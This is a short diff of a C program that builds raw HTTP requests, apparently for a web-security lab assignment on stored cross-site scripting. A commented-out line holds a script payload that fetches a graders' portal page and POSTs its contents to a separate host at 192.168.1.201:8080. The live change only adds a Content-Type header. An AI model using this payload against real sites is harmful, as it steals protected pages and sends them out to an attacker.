@@ -184,6 +184,7 @@ int32_t main() {
 //        "GET /task2stored.php?comment=<script>" "(async () => {" " const url = '/GradersPortalTask2.php';" "" " try {" " const response = await fetch(url);" "" " if (!response.ok) {" " throw new Error(HTTP error! Status: ${response.status});" " }" " const data = await response.text();" "" " console.log('Success:', data);" "" " const my_url = 'http://192.168.1.201:8080';" "" " response = await fetch(my_url, {" " method: 'POST'," " body: data," " });" "" " if (!response.ok) {" " throw new Error(HTTP error! Status: ${response.status});" " }" "" " } catch (error) {" " console.error('Fetch failed:', error);" " return null;" " }" "})();" "" "</script>" " HTTP/ 1.1\r\n"
         "Host: " STR(WEB_SERVER_ADDR) "\r\n"
         "Connection: close\r\n"
+        "Content-Type: text/html\r\n"
         "Content-Length: 5\r\n"
         "\r\n"
         "comment=hiiii"
